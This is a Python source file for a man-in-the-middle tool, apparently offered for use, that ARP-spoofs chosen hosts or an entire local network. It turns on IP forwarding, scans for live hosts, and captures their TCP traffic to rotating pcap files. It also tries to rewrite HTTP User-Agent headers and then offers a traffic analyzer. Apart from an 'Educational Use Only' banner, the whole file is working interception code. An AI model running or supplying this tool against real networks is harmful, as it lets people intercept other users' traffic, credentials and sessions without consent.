#!/usr/bin/env python3
from flask import app
from scapy.all import *
from scapy.utils import PcapWriter
import os
import sys
import threading
import time
import signal
import subprocess
import ipaddress
import argparse












parser = argparse.ArgumentParser(description="Enhanced MITM Tool with Web Analyzer")

parser.add_argument("-g","--gateway", required=True,type=str, help="Enter the gateway of the network like 192.168.1.1")
parser.add_argument("-i","--interface", required=True,type=str, help="Enter the interface of the network like eth0 or wlan0")



# Configuration
GATEWAY_IP = parser.parse_args().gateway     # Router IP
INTERFACE = parser.parse_args().interface     # Network interface
PACKET_FILTER = "tcp"          # Filter for TCP packets (modify as needed)
PCAP_DIR = "captures"          # Directory to store pcap files
ANALYZER_PATH = "./analyzer/main.py"  # Path to web analyzer

# Global variables
running = True
current_pcap = None
pcap_writer = None
pcap_size_limit = 0
pcap_counter = 1
total_packets = 0
target_ips = []
capture_all = False





def display_banner():
    banner = r"""
__       __  __        __   ______    __                __  __                 
/  \     /  |/  |      /  | /      \  /  |              /  |/  |                     
$$  \   /$$ |$$/   ____$$ |/$$$$$$  |_$$ |_     ______  $$ |$$ |   __   ______  
$$$  \ /$$$ |/  | /    $$ |$$ \__$$// $$   |   /      \ $$ |$$ |  /  | /      \ 
$$$$  /$$$$ |$$ |/$$$$$$$ |$$      \$$$$$$/    $$$$$$  |$$ |$$ |_/$$/ /$$$$$$  |
$$ $$ $$/$$ |$$ |$$ |  $$ | $$$$$$  | $$ | __  /    $$ |$$ |$$   $$<  $$    $$ |
$$ |$$$/ $$ |$$ |$$ \__$$ |/  \__$$ | $$ |/  |/$$$$$$$ |$$ |$$$$$$  \ $$$$$$$$/ 
$$ | $/  $$ |$$ |$$    $$ |$$    $$/  $$  $$/ $$    $$ |$$ |$$ | $$  |$$       |
$$/      $$/ $$/  $$$$$$$/  $$$$$$/    $$$$/   $$$$$$$/ $$/ $$/   $$/  $$$$$$$/                                                                              
  ______                                                                        
 /      \                                                                       
/$$$$$$  |                                                                      
$$ |  $$/                                                                       
$$ |                                                                            
$$ |                                                                            
$$/

By err0rgod./ 

"""
    print(banner)


















# Create captures directory if it doesn't exist
if not os.path.exists(PCAP_DIR):
    os.makedirs(PCAP_DIR)

def enable_ip_forwarding():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def scan_network(network_range, interface):
    print(f"[*] Scanning network {network_range} for alive hosts...")
    ans, unans = arping(network_range, iface=interface, timeout=2, verbose=0)
    alive_hosts = []
    
    for sent, received in ans:
        ip = received.psrc
        if ip != GATEWAY_IP:  # Exclude gateway
            alive_hosts.append(ip)
    
    return alive_hosts

def restore_arp(target_ips, gateway_ip, interface):
    gateway_mac = getmacbyip(gateway_ip)
    for target_ip in target_ips:
        target_mac = getmacbyip(target_ip)
        if target_mac and gateway_mac:
            send(ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip, hwsrc=target_mac), iface=interface, count=5)
            send(ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip, hwsrc=gateway_mac), iface=interface, count=5)
    print("[!] ARP tables restored.")

def arp_spoof(target_ips, gateway_ip, interface):
    gateway_mac = getmacbyip(gateway_ip)
    target_macs = {ip: getmacbyip(ip) for ip in target_ips}
    
    print(f"[*] ARP spoofing {len(target_ips)} targets -> {gateway_ip}")
    try:
        while running:
            for target_ip in target_ips:
                if target_macs.get(target_ip):
                    # Tell the target we're the router
                    send(ARP(op=2, pdst=target_ip, hwdst=target_macs[target_ip], psrc=gateway_ip), iface=interface, verbose=0)
                    # Tell the router we're the target
                    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), iface=interface, verbose=0)
            time.sleep(2)
    except Exception as e:
        print(f"[!] ARP spoofing error: {e}")

def rotate_pcap_file():
    global pcap_writer, pcap_counter, current_pcap
    if pcap_writer:
        pcap_writer.close()
    
    current_pcap = f"{PCAP_DIR}/capture_{pcap_counter}.pcap"
    pcap_writer = PcapWriter(current_pcap, append=True, sync=True)
    pcap_counter += 1
    print(f"[*] Created new pcap file: {current_pcap}")

def packet_callback(packet):
    global total_packets, pcap_writer
    
    if not running:
        return
    
    # Check if we're capturing all or specific targets
    if not capture_all and IP in packet:
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        if src_ip not in target_ips and dst_ip not in target_ips:
            return
    
    total_packets += 1
    
    # Write to pcap
    if pcap_writer is None:
        rotate_pcap_file()
    pcap_writer.write(packet)
    
    # Check pcap size if limit is set
    if pcap_size_limit > 0 and os.path.exists(current_pcap):
        if os.path.getsize(current_pcap) >= pcap_size_limit * 1024 * 1024:  # Convert MB to bytes
            rotate_pcap_file()
    
    # Only print every 10th packet to reduce spam
    if total_packets % 10 == 0:
        if IP in packet:
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            proto = packet[IP].proto
            print(f"\r[+] Captured {total_packets} packets (Current: {src_ip} -> {dst_ip})", end="")
            
            if TCP in packet and Raw in packet:
                payload = packet[Raw].load.decode('utf-8', errors='ignore')
                if "User-Agent:" in payload:
                    modified_payload = payload.replace("User-Agent:", "User-Agent: HACKED-BY-MITM")
                    packet[Raw].load = modified_payload.encode()

def signal_handler(sig, frame):
    global running
    print("\n[!] Stopping MITM...")
    running = False
    time.sleep(1)  # Give threads time to stop
    
    if pcap_writer:
        pcap_writer.close()
    
    restore_arp(target_ips, GATEWAY_IP, INTERFACE)
    
    # Ask about web analyzer
    if total_packets > 0:
        choice = input("\n[?] Do you want to view the web analyzer report? (y/n): ").lower()
        if choice == 'y':
            try:
                print("[*] Starting web analyzer...")
                subprocess.Popen(["streamlit", "run", "Analyzer/app.py"])
            except Exception as e:
                print(f"[!] Failed to start analyzer: {e}")
    
    print(f"[*] Total packets captured: {total_packets}")
    print("[!] Exiting...")
    sys.exit(0)

def start_mitm():
    global target_ips, capture_all, pcap_size_limit
    
    signal.signal(signal.SIGINT, signal_handler)
    enable_ip_forwarding()
    
    # Network scanning
    network_range = f"{GATEWAY_IP}/24"
    alive_hosts = scan_network(network_range, INTERFACE)
    
    if not alive_hosts:
        print("[!] No alive hosts found!")
        sys.exit(1)
    
    print("\n[+] Alive hosts:")
    for i, ip in enumerate(alive_hosts, 1):
        print(f"{i}. {ip}")
    
    # Target selection
    choice = input("\n[?] Select target (number), 'all' for whole network, or 'q' to quit: ")
    if choice.lower() == 'q':
        sys.exit(0)
    elif choice.lower() == 'all':
        target_ips = alive_hosts
        capture_all = True
        print("[*] Targeting ALL hosts on the network")
    else:
        try:
            selected = int(choice) - 1
            if 0 <= selected < len(alive_hosts):
                target_ips = [alive_hosts[selected]]
                print(f"[*] Targeting single host: {target_ips[0]}")
            else:
                print("[!] Invalid selection")
                sys.exit(1)
        except ValueError:
            print("[!] Invalid input")
            sys.exit(1)
    
    # PCAP options
    pcap_choice = input("[?] Store in single pcap file or multiple? (s/m): ").lower()
    if pcap_choice == 'm':
        try:
            size_mb = int(input("[?] Enter size limit for each pcap file in MB: "))
            pcap_size_limit = max(1, size_mb)  # At least 1MB
            print(f"[*] Will create new pcap every {pcap_size_limit}MB")
        except ValueError:
            print("[!] Invalid size, using single file")
    
    # Start ARP spoofing
    arp_thread = threading.Thread(target=arp_spoof, args=(target_ips, GATEWAY_IP, INTERFACE))
    arp_thread.daemon = True
    arp_thread.start()
    
    # Start packet capture
    print(f"\n[*] Sniffing traffic on {INTERFACE}... (Press Ctrl+C to stop)")
    sniff(iface=INTERFACE, filter=PACKET_FILTER, prn=packet_callback, store=0)

if __name__ == "__main__":
    display_banner()
    print("[=== ENHANCED MITM TOOL (Educational Use Only) ===]")
    print(f"[*] Gateway IP: {GATEWAY_IP}")
    print(f"[*] Interface: {INTERFACE}")
    start_mitm()